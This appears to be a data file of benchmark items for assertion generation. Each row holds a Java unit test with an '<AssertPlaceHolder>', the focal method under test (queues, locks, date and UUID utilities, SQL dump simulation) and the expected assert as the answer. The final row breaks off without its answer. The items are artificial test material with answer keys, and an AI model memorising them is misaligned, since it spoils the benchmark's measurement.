flushDeferred(boolean singleRun) { final int batchSize = getBatchSize(); boolean interrupted = false; do { List<E> nextBatch = new ArrayList<>(batchSize); // get at most batchSize elements at once m_queue.drainTo(nextBatch, batchSize);  if (nextBatch.size() < batchSize) { // wait maxDelayMillis for additional elements long timeout = getMaxDelayMillis(); final long deadline = System.currentTimeMillis() + timeout; try { E next; while (timeout > 0 && (next = m_queue.poll(timeout, TimeUnit.MILLISECONDS)) != null) { nextBatch.add(next); if (nextBatch.size() == batchSize) { break; } timeout = deadline - System.currentTimeMillis(); } } catch (InterruptedException e) { // do not exit here but execute batch operations on elements that were already collected // and update internal state so that next add will schedule another flush job. interrupted = true; } }  if (nextBatch.isEmpty()) { break; }  try { getBatchOperation().accept(nextBatch); } catch (RuntimeException e) { LOG.error(""Exception occurred while execution batch operation"", e); } } while (!interrupted && !singleRun);  // check whether other elements arrived in the mean time within an exclusive lock // to prevent race conditions. This job will finish. But if new items arrived, a new // job is scheduled. m_lock.writeLock().lock(); try { if (m_queue.isEmpty()) { // no new elements -> reset flushJobScheduled property so that the next invocation of // add will schedule a new flush job m_flushJobScheduled.set(false); m_flushJobFuture = null; } else { // there are already new elements -> schedule a new flush job (Note: m_flushJobScheduled // is still true, hence invocations of add did not schedule another job). scheduleFlushJob(); } } finally { m_lock.writeLock().unlock(); } }"	"assertEquals(asList(""first"", ""second""), batch)"
"testFlushDeferredQueueHasBatchSizeElementsUsingAddAndAddAll() { List<String> batch = new ArrayList<>(); FixtureDeferredOperationQueue<String> queue = new FixtureDeferredOperationQueue<>(QUEUE_TRANSACTION_MEMBER_ID, 2, TimeUnit.HOURS.toMillis(10), batch::addAll); RunContexts.empty().run(() -> { queue.add(""first""); queue.addAll(Stream.of(""second"")); }); queue.flushDeferred(true); ""<AssertPlaceHolder>""; }
flushDeferred(boolean singleRun) { final int batchSize = getBatchSize(); boolean interrupted = false; do { List<E> nextBatch = new ArrayList<>(batchSize); // get at most batchSize elements at once m_queue.drainTo(nextBatch, batchSize);  if (nextBatch.size() < batchSize) { // wait maxDelayMillis for additional elements long timeout = getMaxDelayMillis(); final long deadline = System.currentTimeMillis() + timeout; try { E next; while (timeout > 0 && (next = m_queue.poll(timeout, TimeUnit.MILLISECONDS)) != null) { nextBatch.add(next); if (nextBatch.size() == batchSize) { break; } timeout = deadline - System.currentTimeMillis(); } } catch (InterruptedException e) { // do not exit here but execute batch operations on elements that were already collected // and update internal state so that next add will schedule another flush job. interrupted = true; } }  if (nextBatch.isEmpty()) { break; }  try { getBatchOperation().accept(nextBatch); } catch (RuntimeException e) { LOG.error(""Exception occurred while execution batch operation"", e); } } while (!interrupted && !singleRun);  // check whether other elements arrived in the mean time within an exclusive lock // to prevent race conditions. This job will finish. But if new items arrived, a new // job is scheduled. m_lock.writeLock().lock(); try { if (m_queue.isEmpty()) { // no new elements -> reset flushJobScheduled property so that the next invocation of // add will schedule a new flush job m_flushJobScheduled.set(false); m_flushJobFuture = null; } else { // there are already new elements -> schedule a new flush job (Note: m_flushJobScheduled // is still true, hence invocations of add did not schedule another job). scheduleFlushJob(); } } finally { m_lock.writeLock().unlock(); } }"	"assertEquals(asList(""first"", ""second""), batch)"
"testFlushDeferredQueueHasLessThanBatchSizeElements() { List<String> batch = new ArrayList<>(); FixtureDeferredOperationQueue<String> queue = new FixtureDeferredOperationQueue<>(QUEUE_TRANSACTION_MEMBER_ID, 2, 100, batch::addAll); RunContexts.empty().run(() -> queue.add(""single"")); queue.flushDeferred(true); ""<AssertPlaceHolder>""; }
flushDeferred(boolean singleRun) { final int batchSize = getBatchSize(); boolean interrupted = false; do { List<E> nextBatch = new ArrayList<>(batchSize); // get at most batchSize elements at once m_queue.drainTo(nextBatch, batchSize);  if (nextBatch.size() < batchSize) { // wait maxDelayMillis for additional elements long timeout = getMaxDelayMillis(); final long deadline = System.currentTimeMillis() + timeout; try { E next; while (timeout > 0 && (next = m_queue.poll(timeout, TimeUnit.MILLISECONDS)) != null) { nextBatch.add(next); if (nextBatch.size() == batchSize) { break; } timeout = deadline - System.currentTimeMillis(); } } catch (InterruptedException e) { // do not exit here but execute batch operations on elements that were already collected // and update internal state so that next add will schedule another flush job. interrupted = true; } }  if (nextBatch.isEmpty()) { break; }  try { getBatchOperation().accept(nextBatch); } catch (RuntimeException e) { LOG.error(""Exception occurred while execution batch operation"", e); } } while (!interrupted && !singleRun);  // check whether other elements arrived in the mean time within an exclusive lock // to prevent race conditions. This job will finish. But if new items arrived, a new // job is scheduled. m_lock.writeLock().lock(); try { if (m_queue.isEmpty()) { // no new elements -> reset flushJobScheduled property so that the next invocation of // add will schedule a new flush job m_flushJobScheduled.set(false); m_flushJobFuture = null; } else { // there are already new elements -> schedule a new flush job (Note: m_flushJobScheduled // is still true, hence invocations of add did not schedule another job). scheduleFlushJob(); } } finally { m_lock.writeLock().unlock(); } }"	"assertEquals(asList(""single""), batch)"
"testFlushDeferredQueueHasNoElements() { List<String> batch = new ArrayList<>(); FixtureDeferredOperationQueue<String> queue = new FixtureDeferredOperationQueue<>(QUEUE_TRANSACTION_MEMBER_ID, 2, 100, batch::addAll); queue.flushDeferred(true); ""<AssertPlaceHolder>""; }
flushDeferred(boolean singleRun) { final int batchSize = getBatchSize(); boolean interrupted = false; do { List<E> nextBatch = new ArrayList<>(batchSize); // get at most batchSize elements at once m_queue.drainTo(nextBatch, batchSize);  if (nextBatch.size() < batchSize) { // wait maxDelayMillis for additional elements long timeout = getMaxDelayMillis(); final long deadline = System.currentTimeMillis() + timeout; try { E next; while (timeout > 0 && (next = m_queue.poll(timeout, TimeUnit.MILLISECONDS)) != null) { nextBatch.add(next); if (nextBatch.size() == batchSize) { break; } timeout = deadline - System.currentTimeMillis(); } } catch (InterruptedException e) { // do not exit here but execute batch operations on elements that were already collected // and update internal state so that next add will schedule another flush job. interrupted = true; } }  if (nextBatch.isEmpty()) { break; }  try { getBatchOperation().accept(nextBatch); } catch (RuntimeException e) { LOG.error(""Exception occurred while execution batch operation"", e); } } while (!interrupted && !singleRun);  // check whether other elements arrived in the mean time within an exclusive lock // to prevent race conditions. This job will finish. But if new items arrived, a new // job is scheduled. m_lock.writeLock().lock(); try { if (m_queue.isEmpty()) { // no new elements -> reset flushJobScheduled property so that the next invocation of // add will schedule a new flush job m_flushJobScheduled.set(false); m_flushJobFuture = null; } else { // there are already new elements -> schedule a new flush job (Note: m_flushJobScheduled // is still true, hence invocations of add did not schedule another job). scheduleFlushJob(); } } finally { m_lock.writeLock().unlock(); } }"	assertEquals(emptyList(), batch)
"testFlushEmptyWithoutFlushJobRunning() { List<String> batch = new ArrayList<>(); FixtureDeferredOperationQueue<String> queue = new FixtureDeferredOperationQueue<>(QUEUE_TRANSACTION_MEMBER_ID, 2, TimeUnit.HOURS.toMillis(10), batch::addAll); queue.flush(); ""<AssertPlaceHolder>""; }
flush() { final IFuture<?> flushJobFuture = m_flushJobFuture; if (flushJobFuture != null) { flushJobFuture.cancel(true); try { flushJobFuture.awaitFinished(1, TimeUnit.SECONDS); } catch (RuntimeException | PlatformError e) { // ignore runtime exceptions and platform errors } } List<E> batch = new LinkedList<>(); m_queue.drainTo(batch); if (!batch.isEmpty()) { getBatchOperation().accept(batch); } }"	assertEquals(emptyList(), batch)
"InterruptedException { GroupedSynchronizer<HashObj, Object> lck = new GroupedSynchronizer<>(); HashObj obj1 = new HashObj(0); HashObj obj2 = new HashObj(0); CountDownLatch task1Started = new CountDownLatch(1); CountDownLatch finish = new CountDownLatch(1);  IFuture<Void> task1 = Jobs.schedule(() -> lck.runInGroupLock(obj1, () -> signalFirstAwaitSecond(task1Started, finish), Function.identity()), Jobs.newInput()); task1Started.await(1, TimeUnit.MINUTES);  IFuture<Object> task2 = Jobs.schedule(() -> lck.applyInGroupLock(obj2, obj -> new Object(), Function.identity()), Jobs.newInput()); task2.awaitDone(1, TimeUnit.MINUTES);  finish.countDown(); task1.awaitDone(1, TimeUnit.MINUTES); ""<AssertPlaceHolder>""; }
numLockedRootLocks() { return (int) Stream.of(m_rootLocks) .filter(ReentrantReadWriteLock::isWriteLocked) .count(); }"	assertEquals(0, lck.numLockedRootLocks())
"InterruptedException { GroupedSynchronizer<HashObj, Object> lck = new GroupedSynchronizer<>(); HashObj obj1 = new HashObj(0); HashObj obj2 = new HashObj(0); Object grp1 = new Object(); Object grp2 = new Object(); CountDownLatch task1Started = new CountDownLatch(1); CountDownLatch finish = new CountDownLatch(1);  IFuture<Void> task1 = Jobs.schedule(() -> lck.runInGroupLock(obj1, () -> signalFirstAwaitSecond(task1Started, finish), k -> grp1), Jobs.newInput()); task1Started.await(1, TimeUnit.MINUTES);  IFuture<Object> task2 = Jobs.schedule(() -> lck.applyInGroupLock(obj1, obj -> new Object(), k -> grp1), Jobs.newInput()); //TODO: countDown in finally clauses!!  IFuture<Object> task3 = Jobs.schedule(() -> lck.applyInGroupLock(obj2, obj -> new Object(), k -> grp2), Jobs.newInput()); try { task3.awaitDoneAndGet(4, TimeUnit.SECONDS); } finally { finish.countDown(); task1.awaitDone(1, TimeUnit.MINUTES); task2.awaitDone(1, TimeUnit.MINUTES); } ""<AssertPlaceHolder>""; }
numLockedRootLocks() { return (int) Stream.of(m_rootLocks) .filter(ReentrantReadWriteLock::isWriteLocked) .count(); }"	assertEquals(0, lck.numLockedRootLocks())
"testFormatTimePeriod2() { BigDecimal value = BigDecimal.valueOf(11L).setScale(100, RoundingMode.HALF_UP); BigDecimal day = BigDecimal.valueOf(86400L).setScale(100, RoundingMode.HALF_UP); BigDecimal d = value.divide(day, RoundingMode.HALF_UP); String result = m_formatter.formatTimePeriod(d); ""<AssertPlaceHolder>""; }
formatTimePeriod(BigDecimal d) { if (d == null) { return null; } else if (d.compareTo(BigDecimal.ZERO) <= 0) { return ""00:00:00""; } long days = d.longValue(); int sec = d.subtract(BigDecimal.valueOf(days)).multiply(BigDecimal.valueOf(SECONDS_PER_DAY)).setScale(0, RoundingMode.HALF_UP).intValue(); int s = sec % 60; sec = sec / 60; int m = sec % 60; sec = sec / 60; int h = sec % 24; String t = """"; if (days > 0) { if (days > 1) { t = days + "" "" + TEXTS.get(""Days"") + "" ""; } else { t = days + "" "" + TEXTS.get(""Day"") + "" ""; } } t = t + StringUtility.lpad("""" + h, ""0"", 2) + "":"" + StringUtility.lpad("""" + m, ""0"", 2) + "":"" + StringUtility.lpad("""" + s, ""0"", 2); return t; }"	"assertEquals(""Formatted Time"", ""00:00:11"", result)"
"testFormatTimePeriod3() { Object o = 5L; BigDecimal d = TypeCastUtility.castValue(o, BigDecimal.class); String result = m_formatter.formatTimePeriod(d); ""<AssertPlaceHolder>""; }
formatTimePeriod(BigDecimal d) { if (d == null) { return null; } else if (d.compareTo(BigDecimal.ZERO) <= 0) { return ""00:00:00""; } long days = d.longValue(); int sec = d.subtract(BigDecimal.valueOf(days)).multiply(BigDecimal.valueOf(SECONDS_PER_DAY)).setScale(0, RoundingMode.HALF_UP).intValue(); int s = sec % 60; sec = sec / 60; int m = sec % 60; sec = sec / 60; int h = sec % 24; String t = """"; if (days > 0) { if (days > 1) { t = days + "" "" + TEXTS.get(""Days"") + "" ""; } else { t = days + "" "" + TEXTS.get(""Day"") + "" ""; } } t = t + StringUtility.lpad("""" + h, ""0"", 2) + "":"" + StringUtility.lpad("""" + m, ""0"", 2) + "":"" + StringUtility.lpad("""" + s, ""0"", 2); return t; }"	"assertEquals(""Formatted Time"", ""5 "" + TEXTS.get(""Days"") + "" 00:00:00"", result)"
"testAddDatetoNullFull() { ""<AssertPlaceHolder>""; }
addDays(Date d, double count) { if (d == null) { return null; } int sign = 1; if (count < 0) { count = -count; sign = -1; } double roundingFactor = (sign > 0) ? 0.000004 : 0.0000017; int sec = (int) ((count + roundingFactor) * 3600 * 24); Calendar cal = Calendar.getInstance(); cal.setTime(d); cal.add(Calendar.DATE, sign * (sec / 3600 / 24)); cal.add(Calendar.HOUR_OF_DAY, sign * ((sec / 3600) % 24)); cal.add(Calendar.MINUTE, sign * ((sec / 60) % 60)); cal.add(Calendar.SECOND, sign * ((sec) % 60)); return cal.getTime(); }"	assertNull(DateUtility.addDays(null, -1))
"testAddMonthstoNullFull() { ""<AssertPlaceHolder>""; }
addMonths(Date d, int count) { if (d == null) { return null; } Calendar cal = Calendar.getInstance(); cal.setTime(d); cal.add(Calendar.MONTH, count); return cal.getTime(); }"	assertNull(DateUtility.addMonths(null, -1))
"testToLocalDate() { Date date = dateOf(""2021-05-28 00:00:00.000""); ""<AssertPlaceHolder>""; }
toLocalDate(Date d) { if (d == null) { return null; } return d.toInstant() .atZone(ZoneId.systemDefault()) .toLocalDate(); }"	assertEquals(LocalDate.of(2021, Month.MAY, 28), DateUtility.toLocalDate(date))
"testToLocalDateTime() { Date date = dateOf(""2021-05-28 10:58:25.000""); ""<AssertPlaceHolder>""; }
toLocalDateTime(Date d) { if (d == null) { return null; } return d.toInstant() .atZone(ZoneId.systemDefault()) .toLocalDateTime(); }"	assertEquals(LocalDateTime.of(2021, Month.MAY, 28, 10, 58, 25), DateUtility.toLocalDateTime(date))
"testRemove() { FastListenerList<EventListener> listenerList = new FastListenerList<>(); EventListener listener = new EventListener() { }; listenerList.add(listener); listenerList.add(listener); listenerList.remove(listener); Assert.""<AssertPlaceHolder>""; }
remove(LISTENER listener) { synchronized (lockObject()) { super.remove(listener); } }"	assertEquals(0, listenerList.indexes().size())
"testRemoveAll() { FastListenerList<EventListener> listenerList = new FastListenerList<>(); EventListener listener = new EventListener() { }; listenerList.add(listener); listenerList.add(listener); listenerList.remove(listener); Assert.""<AssertPlaceHolder>""; }
remove(LISTENER listener) { synchronized (lockObject()) { super.remove(listener); } }"	assertEquals(0, listenerList.indexes().size())
"testToByteArray() { ""<AssertPlaceHolder>""; }
toByteArray(UUID uuid) { ByteBuffer bb = ByteBuffer.wrap(new byte[UUID_BYTE_LENGTH]); bb.putLong(uuid.getMostSignificantBits()); bb.putLong(uuid.getLeastSignificantBits()); return bb.array(); }"	assertArrayEquals(BYTES, s_helper.toByteArray(TEST_UUID))
"testEncodeDecode() { UUID uuid = UUID.randomUUID(); String encoded = s_helper.encodeUrlSafe(uuid); UUID decoded = s_helper.decodeUrlSafe(encoded); ""<AssertPlaceHolder>""; }
decodeUrlSafe(String string) { byte[] bytes = Base64Utility.decodeUrlSafe(string); return fromByteArray(bytes); }"	assertEquals(uuid, decoded)
"testRegistrationCleared() { BeanAnnotations ba = new BeanAnnotations(); BeanFieldFixture a = new BeanFieldFixture(); ba.init(a); ba.clear(); ""<AssertPlaceHolder>""; }
clear() { if (m_regs != null) { for (IBean<?> bean : m_regs) { Platform.get().getBeanManager().unregisterBean(bean); } } m_regs = null; }"	assertNull(BEANS.opt(TA.class))
"Exception { JUnitExceptionHandler exceptionHandler = BEANS.get(JUnitExceptionHandler.class); exceptionHandler.ignoreExceptionOnce(TestException1.class, () -> exceptionHandler.handle(new TestException1())); ""<AssertPlaceHolder>""; }
getErrors() { return m_errors; }"	assertTrue(exceptionHandler.getErrors().isEmpty())
"Exception { JUnitExceptionHandler exceptionHandler = BEANS.get(JUnitExceptionHandler.class); exceptionHandler.ignoreExceptionOnce(TestException2.class, () -> exceptionHandler.handle(new TestException1())); ""<AssertPlaceHolder>""; }
getErrors() { return m_errors; }"	assertEquals(1, exceptionHandler.getErrors().size())
"testDescribeChild() { final String testName = SampleParameterizedTestClass.class.getSimpleName(); final List<IScoutTestParameter> parameterList = SampleParameterizedTestClass.getParameters(); ParameterizedFrameworkMethod parameterizedTestMethod = new ParameterizedFrameworkMethod(m_parameterizedTestMethod, 0);  Description testDescription = ParameterizedTestRunnerExtension.describeParameterizedChild(m_testClass, parameterizedTestMethod, testName, parameterList); String expectedTestDescription = testName + "" ["" + SampleParameterizedTestClass.TEST_PARAMETER_NAME_1 + ""]""; ""<AssertPlaceHolder>""; }
describeParameterizedChild(TestClass testClass, ParameterizedFrameworkMethod parameterizedMethod, String testName, List<IScoutTestParameter> parameterList) { return Description.createTestDescription(testClass.getJavaClass(), String.format(""%s [%s]"", testName, parameterList.get(parameterizedMethod.getParamIndex()).getName()), parameterizedMethod.getAnnotations()); }"	assertTrue(testDescription.getDisplayName().startsWith(expectedTestDescription))
"testLazyClientInstance() { JerseyTestRestClientHelper restClientHelper = BEANS.get(JerseyTestRestClientHelper.class); Client client1 = BEANS.get(RestClientProxyFactory.class).unwrap(restClientHelper.client()); Client client2 = BEANS.get(RestClientProxyFactory.class).unwrap(restClientHelper.client()); ""<AssertPlaceHolder>""; }
client() { return client(this::transformException); }"	"assertEquals(""expect same client instance on multiple calls"", client1, client2)"
"testDoFormatRequestLine() { RequestLine reqLine = new RequestLine(""GET"", ""/a,b"", new ProtocolVersion(""HTTP"", 1, 1)); LineFormatterWithUriEncoder lineFormatter = new LineFormatterWithUriEncoder(new MockUriEncoder());  CharArrayBuffer buffer = new CharArrayBuffer(20); lineFormatter.formatRequestLine(buffer, reqLine);  ""<AssertPlaceHolder>""; }
formatRequestLine(final CharArrayBuffer buffer, final RequestLine reqline) { Args.notNull(buffer, ""Char array buffer""); Args.notNull(reqline, ""Request line""); buffer.append(reqline.getMethod()); buffer.append(' '); // <customized> String uri = m_requestUriEncoder.encodeRequestUri(reqline.getUri()); buffer.append(uri); // </customized> buffer.append(' '); buffer.append(reqline.getProtocolVersion().format()); // super.formatProtocolVersion not visible.. }"	"assertEquals(""GET /a%2Cb HTTP/1.1"", buffer.toString())"
"testAllLevelsStream() { Set<PermissionLevel> levels = PermissionLevel.all(); ""<AssertPlaceHolder>""; }
all() { return new HashSet<>(s_singletonMap.values()); }"	assertTrue(levels.containsAll(Arrays.asList(PermissionLevel.ALL, PermissionLevel.NONE, PermissionLevel.UNDEFINED, TestPermissionLevels.GRANTED, TestPermissionLevels.DENIED)))
"testCreateHttpClientInfo() { Map<String, HttpClientInfo> testMap = initTestMap(); for (String userAgent : testMap.keySet()) { HttpClientInfo createdHttpClientInfo = newHttpClientInfo(userAgent); HttpClientInfo expectedHttpClientInfo = testMap.get(userAgent);  //Ignore versions if not explicitly set if (expectedHttpClientInfo.getEngineVersion() == null) { createdHttpClientInfo.setEngineVersion(null); } if (expectedHttpClientInfo.getSystemVersion() == null) { createdHttpClientInfo.setSystemVersion(null); }  ""<AssertPlaceHolder>""; } }
setSystemVersion(Version systemVersion) { m_systemVersion = systemVersion; }"	assertEquals(expectedHttpClientInfo, createdHttpClientInfo)
"testLookupCall() { LookupCall call = new LookupCall() { private static final long serialVersionUID = 1L; };  // AbstractSqlService sqlService = new AbstractSqlService() { }; BeanInstanceUtil.initializeBeanInstance(sqlService); StatementProcessor sp = new StatementProcessor( sqlService, ""SELECT P.PERSON_NR,P.NAME"" + "" FROM PERSON P "" + "" WHERE P.PERSON_NR=:key "" + "" AND P.NAME like '%'||:text||'%'"", new Object[]{call}); sp.simulate();  String sqlPlainTextDump = sp.createSqlDump(false, true); ""<AssertPlaceHolder>""; }
createSqlDump(boolean statementWithBinds, boolean statementPlainText) { StringBuilder debugBindBuf = new StringBuilder(); if (m_currentInputBindMap == null) { try { prepareInputStatementAndBinds(); } catch (Exception t) { return t.getMessage(); } } if (m_currentInputBindMap == null) { return """"; } if (m_inputList != null) { for (IBindInput in : m_inputList) { SqlBind bind = m_currentInputBindMap.get(in.getJdbcBindIndex()); if (bind == null) { continue; } debugBindBuf.append(""IN  ""); debugBindBuf.append(in.getToken().getParsedToken()); debugBindBuf.append("" => ""); debugBindBuf.append(in.getToken().getReplaceToken()); debugBindBuf.append("" [""); debugBindBuf.append(SqlBind.decodeJdbcType(bind.getSqlType())); switch (bind.getSqlType()) { case Types.BLOB: case Types.CLOB: { //nop break; } default: { debugBindBuf.append("" ""); debugBindBuf.append(bind.getValue()); } } debugBindBuf.append(""]""); debugBindBuf.append(""\n""); } } if (m_outputList != null) { for (IBindOutput out : m_outputList) { debugBindBuf.append(""OUT ""); debugBindBuf.append(out.getToken().getParsedToken()); debugBindBuf.append("" => ""); debugBindBuf.append(out.getToken().getReplaceToken()); Class bindType = out.getBindType(); if (bindType != null) { debugBindBuf.append("" [""); debugBindBuf.append(bindType.getSimpleName()); debugBindBuf.append(""]""); } debugBindBuf.append(""\n""); } } StringBuilder buf = new StringBuilder(); if (statementWithBinds) { buf.append(""SQL with binds:\n""); buf.append(SqlFormatter.wellform(m_originalStm).trim()); if (debugBindBuf != null && debugBindBuf.length() > 0) { buf.append(""\n""); buf.append(debugBindBuf.toString().trim()); } } if (statementPlainText) { String p = m_currentInputStm != null ? m_currentInputStm : """"; List<SqlBind> bindList = new ArrayList<>(m_currentInputBindMap.values()); int pos = findNextBind(p, 0); int bindIndex = 0; while (pos >= 0 && bindIndex < bindList.size()) { SqlBind bind = bindList.get(bindIndex); String replacement; switch (bind.getSqlType()) { case Types.BLOB: { replacement = ""__BLOB__""; break; } case Types.CLOB: { replacement = ""__CLOB__""; break; } default: { replacement = m_callerService.getSqlStyle().toPlainText(bind.getValue()); } } if (replacement == null) { replacement = ""NULL""; } replacement = replacement.replace('?', ' '); //next p = p.substring(0, pos) + replacement + p.substring(pos + 1);//NOSONAR squid:S2259 pos = findNextBind(p, pos); bindIndex++; } if (buf.length() > 0) { buf.append(""\n""); } buf.append(""SQL PLAIN Log:\n""); buf.append(SqlFormatter.wellform(p).trim()); } return buf.toString(); }"	"assertFalse(sqlPlainTextDump.contains(""UNPARSED""))"
"testSelectLike() { AbstractSqlService sqlService = new AbstractSqlService() { }; BeanInstanceUtil.initializeBeanInstance(sqlService); StatementProcessor sp = new StatementProcessor( sqlService, ""SELECT BP_NR FROM FLM_BP WHERE BP_NO LIKE :bpNo INTO :bpNr"", new Object[]{new NVPair(""bpNo"", ""12""), new NVPair(""bpNr"", new LongHolder())}); sp.simulate();  String sqlPlainTextDump = sp.createSqlDump(false, true); ""<AssertPlaceHolder>""; }
createSqlDump(boolean statementWithBinds, boolean statementPlainText) { StringBuilder debugBindBuf = new StringBuilder(); if (m_currentInputBindMap == null) { try { prepareInputStatementAndBinds(); } catch (Exception t) { return t.getMessage(); } } if (m_currentInputBindMap == null) { return """"; } if (m_inputList != null) { for (IBindInput in : m_inputList) { SqlBind bind = m_currentInputBindMap.get(in.getJdbcBindIndex()); if (bind == null) { continue; } debugBindBuf.append(""IN  ""); debugBindBuf.append(in.getToken().getParsedToken()); debugBindBuf.append("" => ""); debugBindBuf.append(in.getToken().getReplaceToken()); debugBindBuf.append("" [""); debugBindBuf.append(SqlBind.decodeJdbcType(bind.getSqlType())); switch (bind.getSqlType()) { case Types.BLOB: case Types.CLOB: { //nop break; } default: { debugBindBuf.append("" ""); debugBindBuf.append(bind.getValue()); } } debugBindBuf.append(""]""); debugBindBuf.append(""\n""); } } if (m_outputList != null) { for (IBindOutput out : m_outputList) { debugBindBuf.append(""OUT ""); debugBindBuf.append(out.getToken().getParsedToken()); debugBindBuf.append("" => ""); debugBindBuf.append(out.getToken().getReplaceToken()); Class bindType = out.getBindType(); if (bindType != null) { debugBindBuf.append("" [""); debugBindBuf.append(bindType.getSimpleName()); debugBindBuf.append(""]""); } debugBindBuf.append(""\n""); } } StringBuilder buf = new StringBuilder(); if (statementWithBinds) { buf.append(""SQL with binds:\n""); buf.append(SqlFormatter.wellform(m_originalStm).trim()); if (debugBindBuf != null && debugBindBuf.length() > 0) { buf.append(""\n""); buf.append(debugBindBuf.toString().trim()); } } if (statementPlainText) { String p = m_currentInputStm != null ? m_currentInputStm : """"; List<SqlBind> bindList = new ArrayList<>(m_currentInputBindMap.values()); int pos = findNextBind(p, 0); int bindIndex = 0; while (pos >= 0 && bindIndex < bindList.size()) { SqlBind bind = bindList.get(bindIndex); String replacement; switch (bind.getSqlType()) { case Types.BLOB: { replacement = ""__BLOB__""; break; } case Types.CLOB: { replacement = ""__CLOB__""; break; } default: { replacement = m_callerService.getSqlStyle().toPlainText(bind.getValue()); } } if (replacement == null) { replacement = ""NULL""; } replacement = replacement.replace('?', ' '); //next p = p.substring(0, pos) + replacement + p.substring(pos + 1);//NOSONAR squid:S2259 pos = findNextBind(p, pos); bindIndex++; } if (buf.length() > 0) { buf.append(""\n""); } buf.append(""SQL PLAIN Log:\n""); buf.append(SqlFormatter.wellform(p).trim()); } return buf.toString(); }"	"assertFalse(sqlPlainTextDump.contains(""UNPARSED""))"
"testFormData() { IntegerHolder countConcurrent = new IntegerHolder(); PersonFormData formData = new PersonFormData(); formData.getAddressTable().addRow(); formData.getAddressTable().addRow(); // AbstractSqlService sqlService = new AbstractSqlService() { }; BeanInstanceUtil.initializeBeanInstance(sqlService); StatementProcessor sp = new StatementProcessor( sqlService, ""SELECT COUNT(*) "" + ""FROM PERSON P "" + ""WHERE NVL(:birthdate,TO_DATE('1.1.3000','dd.mm.yyyy')) >= SYSDATE "" + ""AND :name like '%Me%' "" + ""AND :{addressTable.street} like '%Park%' "" + ""INTO :countConcurrent "", new Object[]{formData, new NVPair(""countConcurrent"", countConcurrent)}); sp.simulate();  String sqlPlainTextDump = sp.createSqlDump(false, true); ""<AssertPlaceHolder>""; }
createSqlDump(boolean statementWithBinds, boolean statementPlainText) { StringBuilder debugBindBuf = new StringBuilder(); if (m_currentInputBindMap == null) { try { prepareInputStatementAndBinds(); } catch (Exception t) { return t.getMessage(); } } if (m_currentInputBindMap == null) { return """"; } if (m_inputList != null) { for (IBindInput in : m_inputList) { SqlBind bind = m_currentInputBindMap.get(in.getJdbcBindIndex()); if (bind == null) { continue; } debugBindBuf.append(""IN  ""); debugBindBuf.append(in.getToken().getParsedToken()); debugBindBuf.append("" => ""); debugBindBuf.append(in.getToken().getReplaceToken()); debugBindBuf.append("" [""); debugBindBuf.append(SqlBind.decodeJdbcType(bind.getSqlType())); switch (bind.getSqlType()) { case Types.BLOB: case Types.CLOB: { //nop break; } default: { debugBindBuf.append("" ""); debugBindBuf.append(bind.getValue()); } } debugBindBuf.append(""]""); debugBindBuf.append(""\n""); } } if (m_outputList != null) { for (IBindOutput out : m_outputList) { debugBindBuf.append(""OUT ""); debugBindBuf.append(out.getToken().getParsedToken()); debugBindBuf.append("" => ""); debugBindBuf.append(out.getToken().getReplaceToken()); Class bindType = out.getBindType(); if (bindType != null) { debugBindBuf.append("" [""); debugBindBuf.append(bindType.getSimpleName()); debugBindBuf.append(""]""); } debugBindBuf.append(""\n""); } } StringBuilder buf = new StringBuilder(); if (statementWithBinds) { buf.append(""SQL with binds:\n""); buf.append(SqlFormatter.wellform(m_originalStm).trim()); if (debugBindBuf != null && debugBindBuf.length() > 0) { buf.append(""\n""); buf.append(debugBindBuf.toString().trim()); } } if (statementPlainText) { String p = m_currentInputStm != null ? m_currentInputStm : """"; List<SqlBind> bindList = new ArrayList<>(m_currentInputBindMap.values()); int pos = findNextBind(p, 0); int bindIndex = 0; while (pos >= 0 && bindIndex < bindList.size()) { SqlBind bind = bindList.get(bindIndex); String replacement; switch (bind.getSqlType()) { case Types.BLOB: { replacement = ""__BLOB__""; break; } case Types.CLOB: { replacement = ""__CLOB__""; break; } default: { replacement = m_callerService.getSqlStyle().toPlainText(bind.getValue()); } } if (replacement == null) { replacement = ""NULL""; } replacement = replacement.replace('?', ' '); //next p = p.substring(0, pos) + replacement + p.substring(pos + 1);//NOSONAR squid:S2259 pos = findNextBind(p, pos); bindIndex++; } if (buf.length() > 0) { buf.append(""\n""); } buf.append(""SQL PLAIN Log:\n""); buf.append(SqlFormatter.wellform(p).trim()); } return buf.toString(); }"	"assertFalse(sqlPlainTextDump.contains(""UNPARSED""))"
"testCoalesceEmptySet() { InvalidateCacheNotificationCoalescer coalescer = new InvalidateCacheNotificationCoalescer(); List<InvalidateCacheNotification> res = coalescer.coalesce(new ArrayList<>()); ""<AssertPlaceHolder>""; }
coalesce(List<InvalidateCacheNotification> notifications) { List<InvalidateCacheNotification> result = new ArrayList<>(); if (notifications.isEmpty()) { return result; } Map<String, List<ICacheEntryFilter<?, ?>>> filterMap = new HashMap<>(); for (InvalidateCacheNotification notification : notifications) { List<ICacheEntryFilter<?, ?>> list = filterMap.get(notification.getCacheId()); if (list == null) { list = new ArrayList<>(); list.add(notification.getFilter()); } else { coalesceFilters(list, notification.getFilter()); } filterMap.put(notification.getCacheId(), list); }  for (Entry<String, List<ICacheEntryFilter<?, ?>>> entry : filterMap.entrySet()) { for (ICacheEntryFilter<?, ?> filter : entry.getValue()) { result.add(new InvalidateCacheNotification(entry.getKey(), filter)); } } return result; }"	assertTrue(res.isEmpty())
"testEmptyQueue() { List<ClientNotificationMessage> collector = m_queue.getNotifications(10, 10, TimeUnit.MILLISECONDS); ""<AssertPlaceHolder>""; }
getNotifications(int maxAmount, long maxWaitTime, TimeUnit unit) { List<ClientNotificationMessage> collected = new LinkedList<>(); try { //blocking wait to get first message ClientNotificationMessage next = m_notifications.poll(maxWaitTime, unit); if (next != null) { collected.add(next); }  //add more available notifications //with short wait timeout to not go back with one notification when some are about to pop up. int timeout = 234; // 0 for no reschedule while (next != null && collected.size() < maxAmount) { next = m_notifications.poll(timeout, TimeUnit.MILLISECONDS); if (next != null) { collected.add(next); } } } catch (InterruptedException e) { LOG.info(""Interrupted while waiting for client notification messages"", e); } return collected; }"	assertTrue(collector.isEmpty())
"testMaxMessagesQueue() { putTestNotifications(3); List<ClientNotificationMessage> collector = m_queue.getNotifications(2, 10, TimeUnit.MILLISECONDS); ""<AssertPlaceHolder>""; }
